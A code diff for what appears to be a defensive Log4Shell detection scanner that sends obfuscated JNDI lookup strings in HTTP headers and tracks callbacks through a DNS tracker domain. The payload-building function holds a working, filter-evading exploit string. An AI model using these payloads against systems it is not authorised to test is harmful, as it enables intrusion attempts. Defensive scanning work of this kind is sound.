@@ -32,34 +32,26 @@ SERVERS = SERVERLIST.split(",")
 def to_json(msg):
     print(json.dumps(msg))
 
-def randomword(length):
-    letters = string.ascii_lowercase
-    return ''.join(random.choice(letters) for i in range(length))
-
-def payload(domain, header):
-    hashed_domain = hashlib.md5(domain.encode('utf-8')).hexdigest()
+def payload(hashed_domain, header):
     encoded_header = base64.b64encode(header.encode('utf-8')).decode('utf-8').rstrip('=')
     payload = "${${::-j}${::-n}${lower:D}i:l${::-d}${::-a}${lower:P}://127.0.0.1#" + f"{hashed_domain}.{encoded_header}" + ".t.log4shell.tracker.alpha.canada.ca}"
-    to_json({'domain': domain, 'header': header, 'payload': payload})
     return payload
 
-def log4shell(domain):
-    fakedomain = randomword(10)
-    to_json({'domain': domain, 'fake': fakedomain})
+def log4shell(domain, domain_hash):
     try:
         headers = {
-            'User-Agent': payload(fakedomain, "User-Agent"),
-            'Referer': payload(fakedomain, "Referer"),
-            'X-Api-Version': payload(fakedomain, "X-Api-Version"),
-            'X-Csrf-Token': payload(fakedomain, 'X-Csrf-Token'),
-            'X-CSRFToken': payload(fakedomain, 'X-CSRFToken'),
-            'X-Forwarded-For': payload(fakedomain, 'X-Forwarded-For'),
-            'Cookie': payload(fakedomain, 'Cookie'),
+            'User-Agent': payload(domain_hash, "User-Agent"),
+            'Referer': payload(domain_hash, "Referer"),
+            'X-Api-Version': payload(domain_hash, "X-Api-Version"),
+            'X-Csrf-Token': payload(domain_hash, 'X-Csrf-Token'),
+            'X-CSRFToken': payload(domain_hash, 'X-CSRFToken'),
+            'X-Forwarded-For': payload(domain_hash, 'X-Forwarded-For'),
+            'Cookie': payload(domain_hash, 'Cookie'),
         }
         # only use tls because that way headers are encrypted
         response = requests.get(f"https://{domain}", headers=headers, timeout=TIMEOUT)
         response.raise_for_status()
-        to_json({'domain': domain, 'status': response.status_code, 'redirects': list(map(lambda res: res.url, response.history))})
+        to_json({"domain": domain, "hash": domain_hash, "headers": headers, "status": response.status_code, "redirects": list(map(lambda res: res.url, response.history))})
     except requests.exceptions.HTTPError as e:
         to_json({'exception': True, 'status': e.response.status_code, 'reason': e.response.reason})
     except requests.ConnectionError as e:
@@ -92,9 +84,9 @@ async def run(loop):
         reply = msg.reply
         data = msg.data.decode()
         payload = json.loads(msg.data)
-
         domain = payload["domain"]
         domain_key = payload["domain_key"]
+        domain_hash = payload["hash"]
         user_key = payload["user_key"]
         shared_id = payload["shared_id"]
         selectors = payload["selectors"]
@@ -103,7 +95,7 @@ async def run(loop):
             loop = asyncio.get_event_loop()
 
             with ProcessPoolExecutor() as executor:
-                await loop.run_in_executor(executor, functools.partial(log4shell, domain))
+                await loop.run_in_executor(executor, functools.partial(log4shell, domain, domain_hash))
 
         except TimeoutError:
             logging.error(
